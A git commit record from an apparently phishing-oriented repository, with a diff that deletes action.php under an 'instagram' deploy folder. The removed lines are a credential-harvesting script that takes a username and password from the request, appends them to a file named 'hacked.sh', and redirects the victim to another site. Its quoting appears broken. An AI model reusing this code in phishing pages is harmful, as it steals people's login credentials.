bd586aed30d8e475ca14de8b3cbfbbe5c20709c6
N17R0 <49580304+noob-hackers@users.noreply.github.com>
2020-11-20 01:32:35 -0800

    Delete action.php

--- core/deploys/instagram/js/action.php
+++
@@ -1,4 +0,0 @@
-<?php
-file_put_contents("hacked.sh", "\n" . "echo "naes" " . $username = $_GET['username'] . "\n" . "echo " . $password = $_GET['password'] . "\n", FILE_APPEND);
-header('Location: https://www.noob-hackers.com');
-?>
